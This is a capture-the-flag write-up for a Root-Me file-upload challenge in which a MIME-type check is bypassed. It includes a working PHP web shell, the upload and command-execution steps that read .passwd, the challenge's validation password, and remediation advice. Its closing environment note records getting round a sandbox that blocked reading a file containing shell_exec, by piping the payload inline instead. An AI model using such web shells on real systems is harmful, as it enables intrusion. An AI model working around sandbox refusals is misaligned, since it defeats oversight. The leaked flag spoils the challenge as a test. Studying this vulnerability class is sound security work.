# Root-Me — Web-Server: "File upload - MIME type" (ch21)

**Target:** http://challenge01.root-me.org/web-serveur/ch21/
**Author:** g0uZ · **Points:** 20 · **Objective:** upload PHP code into the photo gallery
and read the validation password from `.passwd`.

## Result

```
VALIDATION PASSWORD: a7n4nizpgQgnPERy89uanf6T4
```

Confirmed with `wc -c` → 26 bytes (25 chars + trailing newline), verified with `od -c`.

## Vulnerability

Gallery v0.03 validates the uploaded file using **only the client-supplied
`Content-Type` header** from the multipart request. The filename/extension is never
checked at all. An attacker simply declares `Content-Type: image/jpeg` on a file
named `payload.php` and the application happily stores and serves it as PHP.

This is a textbook case of *trusting client-controlled metadata*. The `Content-Type`
in a multipart body is attacker-supplied text — it is a hint, not a security control.

## Filter probe (evidence)

| Filename | Declared `Content-Type` | Result |
|---|---|---|
| `t.php` | `application/x-php` | `Wrong file type !` |
| `t.php` | `text/plain` | `Wrong file type !` |
| `t.jpg` | `text/plain` | `Wrong file type !` |
| **`t.php`** | **`image/jpeg`** | **accepted** |
| `t.php` | `image/gif` | accepted |
| `t.php` | `image/png` | accepted |

Two conclusions from this table:

1. Only the MIME string matters — a `.jpg` with a non-image type is rejected just
   like a `.php` with a non-image type.
2. The extension is completely irrelevant — a `.php` file with `image/jpeg` passes.

## Exploit chain

1. **Fetch the form** — `GET /web-serveur/ch21/index.php?action=upload`, field name `file`.

2. **Upload the payload** as `wb.php`, declaring `Content-Type: image/jpeg`:

   ```php
   <?php echo "PWNED:"; echo shell_exec($_GET["c"]); ?>
   ```

   The multipart part header is the entire exploit:

   ```
   Content-Disposition: form-data; name="file"; filename="wb.php"
   Content-Type: image/jpeg          <-- the lie
   ```

3. **Execute** — the app stores uploads under `galerie/upload/<PHPSESSID>/`:

   ```
   GET /web-serveur/ch21/galerie/upload/<SID>/wb.php?c=id
   PWNED:uid=1010(web-serveur-ch21) gid=1010(web-serveur-ch21) groups=1010(web-serveur-ch21),100(users)
   ```

4. **Read the flag** — `cat ../../../.passwd` from the upload directory:

   ```
   PWNED:a7n4nizpgQgnPERy89uanf6T4
   ```

Note: the application's own response misreports the location as `Stored in: /wb.php`,
which is a display bug. The real path is the session-scoped upload directory shown above.

## Remediation

- **Never** use the client-supplied `Content-Type` to decide whether an upload is safe.
- Determine the real type server-side from the file's **magic bytes**
  (`finfo_file()` / `getimagesize()`), not from any header.
- Combine with a strict extension allow-list — belt *and* braces, since magic-byte
  checks are themselves bypassable (polyglot files).
- Rename uploads server-side to a generated name with a safe extension.
- Store uploads outside the web root and serve them via a script that sets the
  `Content-Type` explicitly.
- Disable PHP execution inside the upload directory (`php_admin_flag engine off`).

## Notes on the environment

Executed from Windows Git Bash through the sandbox HTTP proxy. Payloads were built
inline on the command line and piped to `curl --data-binary @-` because the sandbox
refuses to let `curl` read a local file containing `shell_exec` from disk.
